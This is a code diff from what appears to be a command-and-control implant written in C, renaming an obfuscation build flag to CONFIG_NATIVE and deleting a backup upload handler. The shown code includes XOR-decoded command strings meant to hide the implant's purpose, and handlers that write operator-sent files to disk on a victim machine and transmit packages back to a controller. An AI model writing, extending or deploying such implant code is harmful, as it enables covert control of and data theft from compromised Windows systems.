@@ -13,7 +13,7 @@
 #define RVNT_COMMAND_LENGTH 5
 
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_NATIVE
 void normalize_path(char* path) {
     const char prefix[] = "\\??\\";
     const char separator[] = "\\";
@@ -207,7 +207,7 @@ VOID CommandUpload( PPARSER Parser ) {
 #endif //CONFIG_ARCH
 
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_NATIVE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_UPLOAD;
     _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
@@ -276,7 +276,7 @@ VOID CommandUpload( PPARSER Parser ) {
     hFile = NULL;
 }
 
-#else
+#else //CONFIG_NATIVE
 
     _tprintf("Command::Upload\n");
 
@@ -313,52 +313,6 @@ VOID CommandUpload( PPARSER Parser ) {
     hFile = NULL;
 }
 #endif
-
-
-VOID CommandUpload_bak( PPARSER Parser ) {
-
-//--------------------------------
-#if CONFIG_OBFUSCATION
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_UPLOAD;
-    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-    _tprintf("Command::Upload\n");
-#endif
-//--------------------------------
-
-    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
-    UINT32   FileSize = 0;
-    UINT32   NameSize = 0;
-    DWORD    Written  = 0;
-    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
-    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
-    HANDLE   hFile    = NULL;
-
-    FileName[ NameSize ] = 0;
-
-    _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
-
-    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
-
-    if ( hFile == INVALID_HANDLE_VALUE ) {
-        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
-    }
-
-    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
-        _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
-    }
-
-    PackageAddInt32( Package, FileSize );
-    PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
-    PackageTransmit( Package, NULL, NULL );
-
-    Cleanup:
-    CloseHandle( hFile );
-    hFile = NULL;
-}
 
 
 VOID CommandDownload( PPARSER Parser ) {
@@ -369,7 +323,7 @@ VOID CommandDownload( PPARSER Parser ) {
 #endif //CONFIG_ARCH
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_NATIVE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_DOWNLOAD;
     _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -448,10 +402,7 @@ VOID CommandDownload( PPARSER Parser ) {
 
     PackageTransmit( Package, NULL, NULL );
 
-
-
-
-#else
+#else //CONFIG_NATIVE
     _tprintf("Command::Download\n");
 
 //--------------------------------
